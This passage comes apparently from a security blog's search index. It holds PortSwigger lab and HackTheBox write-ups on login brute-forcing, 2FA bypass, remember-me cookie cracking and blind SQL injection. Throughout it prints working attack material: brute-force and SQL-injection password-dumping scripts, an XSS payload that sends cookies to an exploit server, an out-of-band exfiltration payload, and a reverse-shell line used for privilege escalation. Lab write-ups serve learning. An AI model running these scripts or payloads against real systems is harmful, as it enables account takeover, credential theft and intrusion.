&quot;__main__&quot;: main()Lab has been solved:Solution #2 - Using Burp Intruder with customized username and password lists.This may be easier and faster as we only need to modify scripts in a ways that wiener:peter appear after 2nd brute-force attempt. Something like carlos:123456 carlos:123457 wiener:peter carlos:234567 carlos:234568 wiener:peter etc.This can be also done using python or bash, by reading file line by line and injecting on 3rd iteration. Mind that in the IF statement, we either output carlos or the actual entry in the username/password table.#!/bin/bash# there are no built in checks. Run as following:# ./custom_wordlist_inject.sh ./portswigger_usernames wiener 3# ./custom_wordlist_inject.sh &amp;lt;wordlist&amp;gt; &amp;lt;either pass or username that we want to inject&amp;gt; &amp;lt;declare on how many cycles injected string should appear&amp;gt;bruteforce_list=$1injection_on=$2declare -i cycles=$3declare -i i=0while read -r linedo i=$i+1 if (($i&amp;lt;$cycles)) then #for usernames only carlos should show as this is the user that is being brute-forced!. Reading the wordlist isn&#39;t really necessary for usernames but i&#39;ll let it be. Either commend out this line: echo $line # or this line #echo &quot;carlos&quot; else echo $injection_on i=0 fidone &amp;lt; $bruteforce_listResult:We can see that on every 3rd iteration, login should theoreticaly succed. Script above can be piped into file to save it on disk!.We can throw both lists to Burp Intruder now and use Pitchfork mode.Modify the Resource pool to 1 or we’ll get blocked… and bruteforceWe’ve got the password = mom. (yes password changes everytime the lab restarts ;)).Solution #3 - Brute-force using Burp Turbo IntruderSimple Burp’s Intruder does not have any scripting possiblilties, but Burp’s Turbo Intruder does. After installing and enabling it, we just need to select our POST request and choose Turbo Intruder through right mouse click and going into Extensions.This is how i’ve set it up:Script:# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.pydef queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=1, pipeline=False ) i = 0 for word in open(&#39;/Users/lukaosojnik/Downloads/pw&#39;): i = i + 1 if i &amp;lt; 2: # do one free run engine.queue(target.req, [&quot;carlos&quot;, word.rstrip()]) elif i == 2: # do one extra run and reset with valid credentials engine.queue(target.req, [&quot;carlos&quot;, word.rstrip()]) engine.queue(target.req, [&quot;wiener&quot;, &quot;peter&quot;]) i = 0 else: breakdef handleResponse(req, interesting): if interesting: table.add(req)It would also be possible to use @MatchStatus(302), which would only display responses with status code 302.Reference: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attackUsername enumeration via account lockThis lab was done by ffuf. I used head -n 10 command on the password list to make a list with 10 passwords. This list was looped through all usernames.User adam stood out, so it was brute-forced again using whole password list.ffuf -w portswigger_passwords:FUZZ_PW -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u &quot;https://0a58009d041cd3f7c0ae1c7f007000a9.web-security-academy.net/login&quot; -d &quot;username=adam&amp;amp;password=FUZZ_PW&quot; --fs 3049 --fs 3101 -x http://127.0.0.1:8080Obviously there is a difference if password maches. Below the comparisson using Burp Comparer:Most probable password dragon has been found and Lab has been solvedBroken brute-force protection, multiple credentials per request This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos’s password, then access his account pageVictim’s username: carlosCandidate passwordsIf web applications login mechanismus is broken and lets you authenticate using multiple passwords as one then that’s definately a security issue. This is exactle what the application in the lab is doing. Let’s check it out.When testing login, we can notice that now we’re dealing with JSON. Let’s try to include multiple passwords in the same Repeater request.Apparently we’ve succeded but we don’t know what the password is, but if we open the session in browser we see that we’ve succesfully finished the lab and that we’re login." }, { "title": "Multi-Factor Authentication (MFA)", "url": "/posts/Multi_Factor_Authentication/", "categories": "Web Application, Broken Authentication", "tags": "Notes, Web Application, Portswigger", "date": "2022-09-30 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. 2FA (two-factor authentication) is based on something you know and something you have and should be implemented in a way so they check the same factor in two/more diferent ways.TOC Intro TOC 2FA simple bypass Bypassing the 2FA through bad auth. implementation 2FA broken logic Vulnerable 2FA broken logic Enumeration 1st Request to /login 2nd Request to /login2 Vulnerable 2FA broken logic Exploitation 2FA bypass using a brute-force attack 2FA Enumeration 2FA Exploitation 2FA simple bypass This lab’s two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user’s 2FA verification code. To solve the lab, access Carlos’s account page. Your credentials: wiener:peter Victim’s credentials carlos:montoyaBypassing the 2FA through bad auth. implementationIf we login as wiener:peter we recieve an Email.If we enter the 4-digit code, we’d get to my-account page.Problem with this applications authentication implementation is that when we’ve entered the username:password we’re already logged in thus skipping the 2FA is entirely possible.If we enter carlos:montoya we’d get asked for 4-digit code BUT if we then just go to /my-account we would have bypassed that step.If we do just that as described, we’d solve the lab!2FA broken logic This lab’s two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos’s account page. Your credentials: wiener:peter Victim’s username: carlos You also have access to the email server to receive your 2FA verification code.Vulnerable 2FA broken logic EnumerationLet’s first login using known working credentials wiener:peter.After entering credentials we have to enter 4-digit code which we can retrieve from Email client with a message like Hello! Your security code is 1731..Let’s inspect both requests now in Burp.1st Request to /login2nd Request to /login2There is an unusual cookie verify=wiener.If we send GET request to login2 to Burp Repeater. Now few Questions arise: Can we simply ask for 2FA token? We should recieve a new code if we use repeater Can we also do it for carlos? We shouldn’t recieve any new code when we use repeater =&amp;gt; GET Request to /login2 Can we bruteforce the code? Will we be redirected to carlos’s my-account or back to login or will we see any errors?Vulnerable 2FA broken logic ExploitationLet’s ask for token for carlos.Send to Turbo Intruder:We know that we need 302 as result, considering how application reacts on correct MFA-code.Code used in Turbo Intruder. Only digits to 3000 will be used, but it could’ve been set to 9999# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.pydef queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=3, requestsPerConnection=4, pipeline=False ) for i in range(3000): engine.queue(target.req, &#39;{:d}&#39;.format(i).zfill(4)) @MatchStatus(302)def handleResponse(req, interesting): if interesting: table.add(req)There was a hit in ca 45 seconds.Code was 0810.If i open same request in the Browser, we’re logged in as Carlos2FA bypass using a brute-force attack This lab’s two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user’s 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos’s account page. Victim’s credentials: carlos:montoya2FA EnumerationSince 2FA mechanismus is pretty much the same as in the previous 2 exercises i’ll just describe what happens: POST Request to login with username and password We land on login2 where we have to enter 4-digit token.Now if there is no Brute-force defense mechanismus on 4-digit PIN we will be able to brute-force it, however we need to bypass CSRF Token as well. After 2 retries we’ll be sent back to login where we need to enter password again.In order bypass CSRF and auto-logout we need to automate the following: Get Request to /login. Capture the CSRF here POST Request to /login GET /login2 POST /login2 with CSRF.2FA ExploitationWe can use Project Sessions with Macro that would help us retrieve new CSRF token. As already mentioned, this would be the requests that we need:If we do a test run, we can see that we’re asked for 4-digit code and CSRF token seems to be present as hidden field.Macro has now been set up:Rule Settings were changed as i’ll be using Target Scope AND Extender for Turbo IntruderNow if we start Intruder, CSRF token should get changed automatically so We don’t need to worry about CSRF and/or do anything with it.Payload was set as following using Numbers:Remember, we would see HTTP Error 400 if CSRF token would not match, so brute-force works!This would also work with Turbo Intruder. I’ve changed script as following:# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.pydef queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=1, #pipeline=False, engine=Engine.BURP ) for i in range(9999): engine.queue(target.req, &#39;{:d}&#39;.format(i).zfill(4)) @MatchStatus(302)def handleResponse(req, interesting): if interesting: table.add(req)There’s a PINI haven’t thought of that, but attack should’ve been stopped as soon as HTTP 302 was returned.Anyways, the lab has been solved!" }, { "title": "Other vulnerable Authentication Mechanismus", "url": "/posts/Alternative_vulnerable_authentication_mechanismus/", "categories": "Web Application, Broken Authentication", "tags": "Notes, Web Application, Portswigger", "date": "2022-09-30 09:00:00 +0200", "snippet": "IntroThis post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.TOC Intro TOC Brute-forcing a stay-logged-in cookie Abusing stay-logged-in mechanismus Offline password cracking (weak hash used for remember-me cookie) Enumeration first! Exploitation next! Brute-forcing a stay-logged-in cookie This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. To solve the lab, brute-force Carlos’s cookie to gain access to his “My account” page. Your credentials: wiener:peter Victim’s username: carlos Candidate passwordsLong story short. This is all about the vulnerable remember me/stay-logged-infunctionality.Abusing stay-logged-in mechanismusLet’s login using wiener:peter. We can see in the response that cookie that is being sent in response includes username and some sort of hash. This md5 hash is password, which is known = peter.This hash persists then in the subsequent requests like /my-account. Let’s try to bruteforce carlos’s password hash in the cookie.We can use sniper mode against my-account without session cookie!For payload we can use the provied password list, we however need do hash he password, add a prefix which is carlos: and encode whole thing as base64If everything has been done correctly, Intruder should be able to find the password:Lab has been solvedOffline password cracking (weak hash used for remember-me cookie) This lab stores the user’s password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos’s stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the “My account” page. Your credentials: wiener:peterVictim’s username: carlos Learning path !!!!!If you’re following our suggested learning path, please note that this lab requires some understanding of topics that we haven’t covered yet. Don’t worry if you get stuck; try coming back later once you’ve developed your knowledge further.!!!!!!Enumeration first!Let’s login firstWe’re supposed to delete an accout: If XSS should do cause a deletion, then we’d need a client to request for /my-account/deleteWe however need to steal the credentials.Exploitation next!For XSS we have a server available:As we already know that there is a XSS, let’s simply leave a message in the comment in one of the postsPayload:&amp;lt;script&amp;gt;document.location=&#39;https://exploit-0a79008a03044c6dc0753916018d0031.web-security-academy.net/c=&#39;+document.cookie&amp;lt;/script&amp;gt;If we check our Access logs we’d see something there:If we check the stay-logged-in token and send it to Decoder we can see it’s carlos’s token:Password can be found on google ==&amp;gt; 26323c16d5f4dabff3bb136f2460a943:onceuponatime for carlos’s user.Now login and delete the Carlos!It would be possible to delete Carlos using XSS, but it was not in focus in this lab!" }, { "title": "Blind SQL Injection", "url": "/posts/Blind_SQL_Injection/", "categories": "Web Application, SQL Injection", "tags": "Notes, Web Application, Portswigger, SQL Injection, Blind SQL Injection", "date": "2022-09-30 09:00:00 +0200", "snippet": "IntroLab at portswigger: Blind SQL InjectionTOC Intro TOC Blind SQL injection with conditional responses Intro Finding the SQL Injection Database Enumeration Does the users table exist Does the Administrator user exist Does the administrator exist How long is the administrator’s password (is it longer than 3 characters) Does the first password letter start with &quot;a&quot; Can we ask for for next character in users password using ascii (numbers) instead? Automatic Solution using Python Blind SQL injection with conditional errors Intro Problems arise - missing concatenation Finding password with Burp Intruder - first character Finding password with Burp Intruder - whole password Automating with Python Blind SQL injection with Time delays Finding Blind SQLi using Time delay Blind SQL injection with time delays and information retrieval Intro Finding the SQL Injection Testing Yes/No Condition Extracting password from administrator Does administrator exist What is the first character of administrator’s password Automation with Python Blind SQL injection with out-of-band data exfiltration Visible error-based SQL injectionBlind SQL injection with conditional responses This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and no error messages are displayed. But the application includes a “Welcome back” message in the page if the query returns any rows. The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.To solve the lab, log in as the administrator user. We know that we have SQLi vulnerability in the TrackingId Cookie value. We also know that we should see “Welcome back” if query return any rows.IntroBut to get an Idea what we’re dealing with, here the website:And here the HTTP Request in BURP:We can observe that we can see the Welcome Back! in the HTTP Response and the TrackingId cookie.Finding the SQL InjectionNow we need to see if we can inject SQL and get Welcome Back! message displayed using following Payload:TrackingId=2msRiqUVGWhY8DWK&#39; OR 1=1 --Yes, we do.Now let’s try: Payload where we remove a letter from Tracking ID and have valid OR statement e.g. TrackingId=2msRiqUVGWhY8DW&#39; OR 1=1 -- Result: we see Welcome Back! so the query is VALID. Payload where we remove a letter from Tracking ID and have invalid OR statement, e.g. TrackingId=2msRiqUVGWhY8DW&#39; OR 1=2 -- Result: there is no Welcome Back! present so the query is INVALID. We haven’t found out anything what Portswigger Web Academy hasn’t already told us, but this is how we would verify the SQL Injection vulnerability, in this case, based on output in the response.Now let’s enumerate the database.Database EnumerationEverything we do now it’s all about finding out if Database has returned something or not. If not, our check has failed. It’s really just asking and observing YES and NO.So let’s ask our database yes/no questionsDoes the users table existWe can use FROM statement and compare SELECT with same string:TrackingId=non-existent&#39; OR (SELECT &#39;a&#39; from Users LIMIT 1)=&#39;a&#39; --Result: YESDoes the Administrator user existTrackingId=non-existent&#39; OR (SELECT &#39;a&#39; from Users where username=&#39;Administrator&#39; LIMIT 1)=&#39;a&#39; --Short answer: NODoes the administrator existTrackingId=non-existent&#39; OR (SELECT &#39;a&#39; from Users where username=&#39;administrator&#39; LIMIT 1)=&#39;a&#39; --Short answer: Yes it does!How long is the administrator’s password (is it longer than 3 characters)TrackingId=non-existent&#39; OR (SELECT &#39;a&#39; from Users WHERE username=&#39;administrator&#39; AND LENGTH(password)&amp;gt;3)=&#39;a&#39; --;Short answer: Yes, password is longer then 3 characters.Does the first password letter start with &quot;a&quot;TrackingId=non-existent&#39; OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a&#39; --Answer: yes it does.Can we ask for for next character in users password using ascii (numbers) instead?Yes we can. We’re asking for ASCII value 97.TrackingId=non-existent&#39; OR (ascii(substring((SELECT password FROM users WHERE username = &#39;administrator&#39;),1,1)))=97 -- So this is how we would go on when dumping the contents of the database. We would need to keep asking if that’s the character in that position etc. This is doable with Burp Intruder, however i don’t know how to really display the password in a right way at the end. I’ve tried to do so in the next chapter, i’ve however used a script that does that for me. Anyways… Dumping the database using Blind SQLInjection is very tedious so it’s good to know what we’re looking for exactly.Automatic Solution using PythonAs mentioned, i would use a script that i’ve used few times for that occasion (Dumping Data using SQLi). I’d search for ascii numbers rather than characters, but display them as normal characters so you can basically just copy-paste the dumped password.import requestsimport sysrequests.urllib3.disable_warnings()def inject_func(ip, inj_str): for j in range(32, 126): # now we update the sqli session = requests.Session() session.verify = False target = &quot;%s&quot; % (ip) cookies = {&quot;TrackingId&quot;:inj_str.replace(&quot;[CHAR]&quot;, str(j)),&quot;session&quot;:&quot;EJOTJEW5lC8QL2zIU83YdnMMEhUT8708&quot;} #proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;} r = session.get(target,cookies=cookies) if &quot;Welcome back&quot; in r.text: return j return 0def main(): if len(sys.argv) != 3: print(&quot;(+) usage: %s &amp;lt;target&amp;gt; &amp;lt;injection&amp;gt;&quot; % sys.argv[0]) print(&#39;(+) eg: %s 192.168.121.103 &quot;select version()&quot;&#39; % sys.argv[0]) sys.exit(-1) ip = sys.argv[1] injection_parameter = sys.argv[2] # e.g. for injection parameter = SELECT Password FROM Users WHERE Username = &#39;Administrator&#39; out = &quot;(+) Retrieving &quot;+ injection_parameter print(out) #no need to exchange spaces etc. #injection_parameter = injection_parameter.replace(&quot; &quot;, &quot;/**/&quot;) for i in range(1, 25): if i != 0: injection_string = &quot;non-existent&#39; OR (ascii(substring((&quot; + injection_parameter + &quot;),%d,1)))=[CHAR] --&quot; % (i) extracted_char = chr(inject_func(ip, injection_string)) sys.stdout.write(extracted_char) sys.stdout.flush() else: break print(&quot;\\n(+) done!&quot;)if __name__ == &quot;__main__&quot;: main()I’ve set the length to 25 manualy, so that many character length will we checked. This could have been automated as well but some other time!As can be seen below, password was retrieved:Lab Done!Blind SQL injection with conditional errorsIntroIn this case the application does not react if SQL query has succeded or not, but rather we provoke an error to determine if our injected query has succeded or not. So again, we’re asking Yes/No questions.Portswigger gives us two examples, where the first should give an error and second should succed.xyz&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;a&#39; END)=&#39;axyz&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;a&#39; END)=&#39;aLet’s first confirm that we actualy have a SQL Injection. We break an application like this: TrackingId=xyz&#39; as we recieve 500 Internal Server Error. If we can fix this, we have won. TrackingId=xyz&#39; OR (SELECT 1)=1 -- which still returns an error, although the second OR statement should succed. Oracle DB however needs FROM or it will return an error. TrackingId=xyz&#39; OR (SELECT 1 from DUAL)=1 -- works: TrackingId=xyz&#39; OR (SELECT 2 FROM dual)=1 -- is still working. TrackingId=xyz&#39; OR (SELECT 2 FROM dual123)=1 -- doesn’t work anymore Check if Table users exist: TrackingId=xyz&#39; OR (SELECT 1 FROM users WHERE ROWNUM = 1)=1 --&#39; - yes it does! We need WHERE ROWNUM = 1 otherwise we get an error instead, becase more then 1 row will be returned.Problems arise - missing concatenationNow again, we need to somehow to evaluate the database but here is where i’ve noticed the problem. It was hard to make CASE work because query as i’ve seen above it’s breaking the WebApplication so i had to resort to concatenation using || which is also the way Portswigger suggest solving the lab. This gives us an 200 OK:xyz&#39;||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39; This returns an error xyz&#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39; Checking if administrator exist xyz&#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39; Result: Yes it does as it returns an error Finding password with Burp Intruder - first characterLet’s throw our query into intruder now.TrackingId=xyz&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;§e§&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;Let’s go with Sniper first to get only first character. Use Brute forcer with default settings and setting Min and Max length to 1:Finding password with Burp Intruder - whole passwordNow let’s cycle through 20 character using Cluster Bomb with 2 payload sets: Numbers from 1 to 21 with Step 1 and Min integer digits set to 1 and Max integer digits set to 2, eveything else to 0 Brute Forcer with Min and Max length set to 1Disable encoding!TrackingId=xyz&#39;||(SELECT CASE WHEN SUBSTR(password,§1§,1)=&#39;§e§&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;;This is the closest that i was able to get:I would have to re-arange the characters as i wasn’t able to start with cycling the 2nd payload set :(.Automating with PythonI’ve automated that password dump with python, again with comparing the characters against the ASCII table. I could’ve made the Ascii range smaller but i did not. Multithreading would also be nice ;) but maybe some other time.import requestsimport sysrequests.urllib3.disable_warnings()def inject_func(ip, inj_str): for j in range(32, 126): # now we update the sqli session = requests.Session() session.verify = False target = &quot;%s&quot; % (ip) cookies = {&quot;TrackingId&quot;:inj_str.replace(&quot;[CHAR]&quot;, str(j)),&quot;session&quot;:&quot;XtNTol6QXK5ZuBb7VkQDo9qoWGtXHxTP&quot;} proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;} r = session.get(target,proxies=proxies,cookies=cookies,verify=False) status_code = r.status_code if status_code == 500: return j return 0def main(): if len(sys.argv) != 2: print(&quot;(+) usage: %s &amp;lt;target&amp;gt; &quot; % sys.argv[0]) print(&#39;(+) eg: %s 192.168.121.103&#39; % sys.argv[0]) sys.exit(-1) ip = sys.argv[1] out = &quot;(+) Retrieving the password&quot; print(out) for i in range(1, 25): if i != 0: injection_string = &quot;xyz&#39;||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=[CHAR] THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;&quot; % (i) extracted_char = chr(inject_func(ip, injection_string)) sys.stdout.write(extracted_char) sys.stdout.flush() else: break print(&quot;\\n(+) done!&quot;)if __name__ == &quot;__main__&quot;: main()Password has been retrieved from the script as well:Lab is done:Blind SQL injection with Time delays This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.So for this lab, it’s only expected to create a delay so let’s get onto it.Finding Blind SQLi using Time delayThe techniques for triggering a time delay are specific to the type of database being used.In this lab we have OracleDB. To make SQLi to work,concatenation (||) had to be used again as in previous lab. My assumption is that we’re injection into WHERE statement.TrackingId=U0z9axszQ7GfsVAt&#39;||PG_SLEEP(10)--We can observe delay in the response:Lab done:Blind SQL injection with time delays and information retrievalIntro This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user.So here the plan is first to find the SQL injection, and then to retrieve the administrators password as it has been done before.Finding the SQL InjectionTrackingId=QRvD0dG8SNkAeEr7&#39;||(SELECT PG_SLEEP(3))||&#39;SQL Injection works with concatenation using || but it also works using stacked queries, separating it with ;:TrackingId=QRvD0dG8SNkAeEr7&#39;%3b(SELECT PG_SLEEP(3))%3b&#39;Testing Yes/No Condition Using CASE WHEN ... THEN statement we get response in 3 seconds TrackingId=QRvD0dG8SNkAeEr7&#39;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--; We should now get response immediatly: TrackingId=QRvD0dG8SNkAeEr7&#39;%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--; session=kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq And yes, we do get a response in 98 miliseconds. Extracting password from administratorDoes administrator existTrackingId=QRvD0dG8SNkAeEr7&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--Answer: Yes it does!What is the first character of administrator’s passwordI’ve used Request Timer here for intruder as intruder itself does not display the response time :(.So the first character is 1 and we could let Intruder find all the characters but let’s try to do the same with Python again. I will again check for ascii values.Checking with repeater if asking for ASCII values actually works:TrackingId=QRvD0dG8SNkAeEr7&#39;%3bSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+ASCII(SUBSTRING(password,1,1))=49)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--; session=kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq… and yes it does! Now let’s automate with PythonAutomation with PythonOnly thing that is different compared to scripts before it’s that we’re using time for comparison before and after request was sent.import requestsimport sysimport timerequests.urllib3.disable_warnings()def inject_func(ip, inj_str): for j in range(32, 126): # now we update the sqli session = requests.Session() session.verify = False target = &quot;%s&quot; % (ip) cookies = {&quot;TrackingId&quot;:inj_str.replace(&quot;[CHAR]&quot;, str(j)),&quot;session&quot;:&quot;kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq&quot;} proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;} time_start=time.time() r = session.get(target,proxies=proxies,cookies=cookies,verify=False) time_finish=time.time() time_total=time_finish - time_start #print(time_total) if time_total &amp;gt; 2: return j return 0def main(): if len(sys.argv) != 2: print(&quot;(+) usage: %s &amp;lt;target&amp;gt; &quot; % sys.argv[0]) print(&#39;(+) eg: %s 192.168.121.103&#39; % sys.argv[0]) sys.exit(-1) ip = sys.argv[1] out = &quot;(+) Retrieving the password&quot; print(out) for i in range(1, 25): if i != 0: injection_string = &quot;QRvD0dG8SNkAeEr7&#39;%%3bSELECT+CASE+WHEN+(username=&#39;administrator&#39;+AND+ASCII(SUBSTRING(password,%d,1))=[CHAR])+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--&quot; % (i) extracted_char = chr(inject_func(ip, injection_string)) sys.stdout.write(extracted_char) sys.stdout.flush() else: break print(&quot;\\n(+) done!&quot;)if __name__ == &quot;__main__&quot;: main()Password has been retrivedLab done:Blind SQL injection with out-of-band data exfiltration This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie The SQL query is executed asynchronously and has no effect on the application’s response. However, you can trigger out-of-band interactions with an external domain The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user.First i should mention i had diffilculties finding the vulnerability by using SQLMap but had more luck with Burp’s ScannerThis is query that Burp has used:Cookie: TrackingId=g3cOtQeauj4CSC6p&#39;%7c%7c(select%20extractvalue(xmltype(&#39;%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rucxp%20SYSTEM%20%22http%3a%2f%2frpkzmgpymoyy6bk563eiduduslyem4a8y1lr9g.oasti&#39;%7c%7c&#39;fy.com%2f%22%3e%25rucxp%3b]%3e&#39;)%2c&#39;%2fl&#39;)%20from%20dual)%7c%7c&#39;;To solve the lab we need to exfiltrate administrator’s password. We can do it by exfiltrating data in the subdomain.If the payload has worked, we should get an entry in the collaborator:Lab has been solved:PS: PortSwiggers SQLi Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheetVisible error-based SQL injection This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned. The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.In this lab, we get to see the error from the query, and if we read the description, it should be in the trackingId cookie.We can fix the query with EEioT3zzbZMmwTuQ&#39;+OR+1=1+--Let us keep in mind we are dealing with error based injection and we should exfiltrate infromation through the errors.As there is truncation in place, following query will work:&#39; AND 2=CAST((SELECT username FROM users LIMIT+1) AS int)+--We can retrieve the password from the same database, without using offset (luckily!)." }, { "title": "(HTB) - Script Kiddie", "url": "/posts/Script_Kiddie/", "categories": "HackTheBox, Other", "tags": "NetBSD, Bozohttpd, Lua, Default Credentials, Code Injection, NGINX, Password Cracking, Password Reuse, Weak Credentials", "date": "2022-09-22 11:33:00 +0200", "snippet": "Script Kiddie is an easy box where we first have to exploit a vulnerable MSFvenom templateENUMERATIONNMAPEXPLOITATIONUsing metasploitkid@scriptkiddie:~/html$ ididuid=1000(kid) gid=1000(kid) groups=1000(kid)id_rsa private key can be downloaded for sshPRIVILEGE ESCALATIONkid@scriptkiddie:/home/pwn$ cat scanlosers.shcat scanlosers.sh#!/bin/bashlog=/home/kid/logs/hackerscd /home/pwn/cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null&quot; &amp;amp;doneif [[ $(wc -l &amp;lt; $log) -gt 0 ]]; then echo -n &amp;gt; $log; fi2021/02/07 09:26:01 CMD: UID=0 PID=1257893 | /usr/sbin/CRON -f 2021/02/07 09:26:01 CMD: UID=0 PID=1257894 | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 2021/02/07 09:28:01 CMD: UID=0 PID=1257896 | /usr/sbin/CRON -f kid@scriptkiddie:~/logs$ echo &quot; ;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.21/9999 0&amp;gt;&amp;amp;1&#39; #&quot; &amp;gt;&amp;gt; hackersget .ssh/id_rsa and connect with sshpwn@scriptkiddie:~$ sudo -lMatching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsolemsf6 &amp;gt; irb[*] Starting IRB shell...[*] You are in the &quot;framework&quot; objectirb: warn: can&#39;t alias jobs from irb_jobs.&amp;gt;&amp;gt; exec &#39;/bin/bash&#39;root@scriptkiddie:/home/pwn# iduid=0(root) gid=0(root) groups=0(root)" }, { "title": "(HTB) - Academy", "url": "/posts/Academy/", "categories": "HackTheBox, Linux", "tags": "Linux, Apache, PHP, Deserialization, CVE-2018-15133, Laravel, Sudo Exploitation, CVE-2017-16894, Public Vulnerabilities, JWT, Clear Text Credentials, Password Reuse, CVE Exploitation, Group Membership", "date": "2022-09-22 11:33:00 +0200", "snippet": "Academy is a new product from hack the box and this box gives a preview into it. This box however unlike the real HTB Academy has been made vulnerableENUMERATIONNMAPLet’s start NMAP22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)| 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)|_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: GET OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that there is port 80 open which seems most insteressting so far.WebPage Add the academy-.htb to hosts file.Register to academy and login:I’ve checked the source code but there is nothing linked.I noticed there are 2 portals available, login for users and admin.admin.php.While registering there it is possible to change the role with roleid parameter.This enabled login to admin.php, and there we can find some hints:Let us put dev-staging-01.academy.htb 